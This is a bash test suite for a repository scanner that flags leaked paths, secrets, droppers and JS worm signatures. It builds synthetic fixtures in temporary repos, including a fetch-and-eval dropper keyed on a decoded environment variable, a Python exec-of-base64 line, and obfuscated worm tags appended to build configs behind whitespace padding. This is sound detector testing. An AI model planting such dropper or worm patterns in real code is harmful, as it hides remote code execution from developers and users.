#!/usr/bin/env bash
# Fixture tests for scan-repo.sh (leak + dropper gate).
# All leak/dropper/secret-shaped content is generated at runtime inside mktemp
# repos so THIS repository never carries a personal path, real secret shape, or
# marker literal. Synthetic/placeholder data only.
# Usage: bash tests/test-scan.sh
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
GATE="$ROOT/scripts/scan-repo.sh"
FAILURES=0

TMP="$(mktemp -d "${TMPDIR:-/tmp}/scan-repo-test.XXXXXX")"
trap 'rm -rf "$TMP"' EXIT

# Isolate fixtures from the operator's git identity, hooks, and signing setup,
# and from any real marker file on this machine.
export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null
export AGENT_SECURITY_MARKERS="$TMP/no-such-markers"

# Leak-shaped strings are assembled, never committed as literals.
HOMESEG="Users"
LEAK_PATH="/$HOMESEG/realoperator42/writing/corpus.txt"
NEUTRAL_PATH="/$HOMESEG/example/dev/notes.md"
SECRET_PREFIX="sk_"
SECRET_VALUE="${SECRET_PREFIX}live_abcdefghijklmnop"

new_repo() { # $1=dir
  git init -q "$1"
  git -C "$1" config user.email fixture@example.com
  git -C "$1" config user.name Fixture
  git -C "$1" config commit.gpgsign false
}

run_expect() { # label, dir, expected exit, [flags...]
  local label="$1" dir="$2" expect="$3"
  shift 3
  local out code=0
  set +e
  out=$(cd "$dir" && bash "$GATE" "$@" 2>&1)
  code=$?
  set -e
  if [[ "$code" -eq "$expect" ]]; then
    echo "  ok  $label (exit $code)"
  else
    echo "  XX  $label — expected exit $expect got $code"
    echo "$out" | tail -15
    FAILURES=$((FAILURES + 1))
  fi
  LAST_OUT="$out"
}

expect_in_output() { # label, needle
  if echo "$LAST_OUT" | grep -qF -- "$2"; then
    echo "  ok  $1"
  else
    echo "  XX  $1 — output lacks: $2"
    FAILURES=$((FAILURES + 1))
  fi
}

echo "agent-security test-scan — runtime fixtures"
echo "---"

# 1) Personal home path fails (PATH class); a neutral placeholder stays clean.
R="$TMP/paths"; new_repo "$R"
printf 'source: %s\n' "$LEAK_PATH" >"$R/setup.md"
printf 'fixture path: %s\n' "$NEUTRAL_PATH" >"$R/clean.md"
git -C "$R" add -A
run_expect "personal path fails --all" "$R" 1 --all
expect_in_output "PATH class labeled" "[PATH"
expect_in_output "generic layer runs without markers" "marker layer: off"
rm "$R/setup.md"; git -C "$R" add -A
run_expect "neutral placeholder path is clean" "$R" 0 --all
expect_in_output "clean verdict" "CLEAN"

# 2) Marker layer: [names]/[paths] from a local file (user config).
R="$TMP/markers"; new_repo "$R"
M="$TMP/markers.txt"
printf '# fixture markers\n[names]\nacmecorp\n[paths]\n/data/acmecorp\n[public]\nmarkers\n' >"$M"
printf 'shipped acmecorp notes from /data/acmecorp/terms\n' >"$R/notes.md"
git -C "$R" add -A
run_expect "marker hits fail" "$R" 1 --all --markers "$M"
expect_in_output "MARKER class labeled" "[MARKER"
expect_in_output "names section attributed" "marker [names]"
AGENT_SECURITY_MARKERS="$M" run_expect "env var marker file honored" "$R" 1 --all

# 3) Allow-pattern passthrough for public-identity exceptions.
R="$TMP/allow"; new_repo "$R"
printf 'maintainer contact: publicdev@gmail.com\n' >"$R/README.md"
git -C "$R" add -A
run_expect "unknown email fails" "$R" 1 --all
expect_in_output "PERSONAL class labeled" "[PERSONAL"
run_expect "allow pattern clears public identity" "$R" 0 --all --allow 'publicdev@gmail\.com'

# 4) Severity: CRITICAL ignores --warn-only; MAJOR downgrades.
R="$TMP/severity"; new_repo "$R"
printf 'API_KEY="%s"\n' "$SECRET_VALUE" >"$R/config.txt"
git -C "$R" add -A
run_expect "secret fails --all" "$R" 1 --all
expect_in_output "SECRET class labeled" "[SECRET"
run_expect "secret still fails under --warn-only" "$R" 1 --all --warn-only
rm "$R/config.txt"
printf 'reach me at private.human@gmail.com\n' >"$R/notes.md"
git -C "$R" add -A
run_expect "major-only fails by default" "$R" 1 --all
run_expect "major-only passes under --warn-only" "$R" 0 --all --warn-only

# 5) Staged is the default scope.
R="$TMP/staged"; new_repo "$R"
printf 'clean seed\n' >"$R/base.md"
git -C "$R" add -A && git -C "$R" commit -qm seed
printf 'draft with %s inside\n' "$LEAK_PATH" >"$R/draft.md"
run_expect "unstaged leak not scanned by default" "$R" 0
git -C "$R" add draft.md
run_expect "staged leak fails default scope" "$R" 1
expect_in_output "staged scope reported" "scope: staged"

# 6) --ref commit ranges.
git -C "$R" commit -qm leak
run_expect "--ref range catches committed leak" "$R" 1 --ref HEAD~1..HEAD
printf 'clean follow-up\n' >"$R/clean2.md"
git -C "$R" add clean2.md && git -C "$R" commit -qm clean
run_expect "--ref clean range passes" "$R" 0 --ref HEAD~1..HEAD

# 7) DROPPER (CRITICAL): decode-of-env feeding an exec sink, same file.
#    Synthetic fixture — an inert defensive example, never a runnable payload.
R="$TMP/dropper"; new_repo "$R"
{ printf 'const u = atob(process.env.SYNTHETIC_CARRIER);\n'
  printf 'module.exports = async () => { eval(await (await fetch(u)).text()); };\n'; } >"$R/build.config.js"
git -C "$R" add -A
run_expect "dropper shape fails" "$R" 1 --all
expect_in_output "DROPPER class labeled" "[DROPPER"
run_expect "dropper still fails under --warn-only" "$R" 1 --all --warn-only
rm "$R/build.config.js"
printf 'export async function load(u) { return (await fetch(u)).json(); }\n' >"$R/loader.js"
git -C "$R" add -A
run_expect "fetch without an exec sink stays clean" "$R" 0 --all

# 8) Base64 blob under an env-var key in a committed .env; .env.example exempt.
R="$TMP/envfile"; new_repo "$R"
# Assemble the inert example.invalid carrier at runtime. Keeping the full
# high-entropy value out of Git avoids training generic secret scanners to
# ignore credential-shaped fixtures while preserving this detector test.
fixture_key_prefix='AUTH_'
fixture_key_suffix='API_KEY'
fixture_value_a='aHR0cHM6Ly9leGFtcGxl'
fixture_value_b='LmludmFsaWQvcGF5bG9hZC5qcw=='
printf '%s%s=%s%s\n' "$fixture_key_prefix" "$fixture_key_suffix" "$fixture_value_a" "$fixture_value_b" >"$R/.env"
printf 'SYNTHETIC_CARRIER=your-key-here\n' >"$R/.env.example"
git -C "$R" add -A -f
run_expect "committed .env base64 blob fails" "$R" 1 --all
expect_in_output "env-file blob attributed" "base64 blob under an env-var key"
rm "$R/.env"; git -C "$R" add -A
run_expect ".env.example placeholder stays clean" "$R" 0 --all

# 9) Widened SINKS beyond eval (python exec of a decoded env value).
R="$TMP/sinks"; new_repo "$R"
printf 'import base64,os\nexec(base64.b64decode(os.environ["X"]))\n' >"$R/conftest.py"
git -C "$R" add -A
run_expect "python exec(b64decode(env)) trips DROPPER" "$R" 1 --all
expect_in_output "env-decode dataflow tell labeled" "decode of an env/argv value"

# 10) INVISIBLE_UNICODE (CRITICAL): a real zero-width codepoint in source.
R="$TMP/invis"; new_repo "$R"
# U+200B zero-width space (bytes e2 80 8b) spliced into a source token.
printf 'const loader = "payload\xe2\x80\x8bhidden";\n' >"$R/index.js"
git -C "$R" add -A
run_expect "zero-width codepoint fails" "$R" 1 --all
expect_in_output "INVISIBLE_UNICODE class labeled" "[INVISIBLE_UNICODE"
rm "$R/index.js"
printf 'const emoji = "done \xe2\x9c\x85";\n' >"$R/ok.js"
git -C "$R" add -A
run_expect "ordinary emoji stays clean" "$R" 0 --all

# 11) Negative controls: a lone dynamic import or lone eval never trips DROPPER.
R="$TMP/negctl"; new_repo "$R"
printf 'const mod = await import("./plugin.js");\nexport default mod;\n' >"$R/app.js"
git -C "$R" add -A
run_expect "lone dynamic import stays clean" "$R" 0 --all
printf 'export function run(code){ return eval(code); }\n' >"$R/repl.js"
git -C "$R" add -A
run_expect "lone eval without an encoder stays clean" "$R" 0 --all

# 12) WORM (CRITICAL): committed-config JS worm — campaign-tag assignment plus
#     whitespace-padded payload appended after the last line of a build config.
#     Synthetic fixture — an inert marker string and dummy identifiers, never a
#     runnable obfuscator payload.
R="$TMP/worm"; new_repo "$R"
WORM_PAD="$(printf '%*s' 7000 '')"
printf 'export default config;%s%s\n' "$WORM_PAD" "global['!']='9-7678';var _0x1a2b3c=1;" >"$R/postcss.config.mjs"
git -C "$R" add -A
run_expect "worm campaign-tag + padding fails" "$R" 1 --all
expect_in_output "WORM class labeled" "[WORM"
expect_in_output "campaign-tag hit attributed" "campaign-tag assignment"
expect_in_output "padding hit attributed" "space/tab run before code"
run_expect "worm still fails under --warn-only" "$R" 1 --all --warn-only

# ...a later wave that drops the padding entirely: the payload is appended directly,
# leaving one enormous line. Synthetic and inert — no real payload is reproduced.
R="$TMP/wormlongline"; new_repo "$R"
printf 'module.exports = {};%s\n' "global['!']='9-7934';var _0xaa11bb=1;$(printf 'x%.0s' $(seq 1 1200))" >"$R/vite.config.js"
git -C "$R" add -A
run_expect "worm padding-free long line fails" "$R" 1 --all
expect_in_output "long-line hit attributed" "line over 1000 chars"

# ...while an ordinary config with a merely long-ish line stays clean.
R="$TMP/wormlongok"; new_repo "$R"
printf 'module.exports = { plugins: {} }; // %s\n' "$(printf 'y%.0s' $(seq 1 300))" >"$R/postcss.config.js"
git -C "$R" add -A
run_expect "ordinary long-ish config line passes" "$R" 0 --all

# ...an alternate campaign tag plus a javascript-obfuscator dispatcher-function
# scaffold, in a tailwind config.
R="$TMP/wormtag"; new_repo "$R"
printf '};%s\n' "global['_V']='A9-7678';function _0x37df(){var _0x580eb4=[1,2,3,4,5];}" >"$R/tailwind.config.js"
git -C "$R" add -A
run_expect "alternate campaign tag + obfuscator scaffold fails" "$R" 1 --all
expect_in_output "obfuscator scaffold attributed" "javascript-obfuscator dispatcher function scaffold"

# ...negative: an ordinary config file stays clean.
R="$TMP/wormneg"; new_repo "$R"
printf 'module.exports = { plugins: { tailwindcss: {}, autoprefixer: {} } };\n' >"$R/postcss.config.js"
git -C "$R" add -A
run_expect "ordinary postcss config stays clean" "$R" 0 --all

# ...negative: a normal long minified line (no whitespace-padding run) stays clean.
R="$TMP/wormneg2"; new_repo "$R"
LONGLINE="var a=1;"
i=0
while [[ "$i" -lt 100 ]]; do LONGLINE+="b$i();"; i=$((i + 1)); done
printf '%s\n' "$LONGLINE" >"$R/bundle.min.js"
git -C "$R" add -A
run_expect "normal minified line without padding stays clean" "$R" 0 --all

# ...an alternate campaign-tag variant (global.i="A10-*32150") plus a distinct
# _0x-obfuscated identifier, whitespace-padded in a build config.
R="$TMP/wormv2"; new_repo "$R"
printf 'module.exports = {};%*s%s\n' 300 '' "global.i=\"A10-*32150\";const _0xabcd12=1;" >"$R/postcss.config.js"
git -C "$R" add -A
run_expect "second campaign-tag variant fails" "$R" 1 --all
expect_in_output "campaign-tag hit attributed" "campaign-tag assignment"

# ...the older long-form of that variant: global.i + require shim reassignment +
# a unicode-escaped module name inside require(...).
R="$TMP/wormv2old"; new_repo "$R"
python3 - "$R/vite.config.js" <<'PY'
import sys
path = sys.argv[1]
content = ('global.i="A10-*32150";global.r=require;'
           'typeof module==="object"&&(global.m=module);'
           'const http=require("\\u0068ttp");\n')
open(path, "w").write(content)
PY
git -C "$R" add -A
run_expect "older long-form variant + unicode-escaped require fails" "$R" 1 --all
expect_in_output "unicode-escaped require attributed" "unicode-escaped module name inside require()"

# ...negative: an ordinary require() call (no unicode escape) in a config file
# stays clean.
R="$TMP/wormreqneg"; new_repo "$R"
printf 'const http = require("http");\nmodule.exports = {};\n' >"$R/vite.config.js"
git -C "$R" add -A
run_expect "ordinary require() stays clean" "$R" 0 --all

echo "---"
if [[ "$FAILURES" -eq 0 ]]; then
  echo "OK — all scan-repo fixtures passed"
  exit 0
fi
echo "FAILED — $FAILURES fixture check(s)"
exit 1
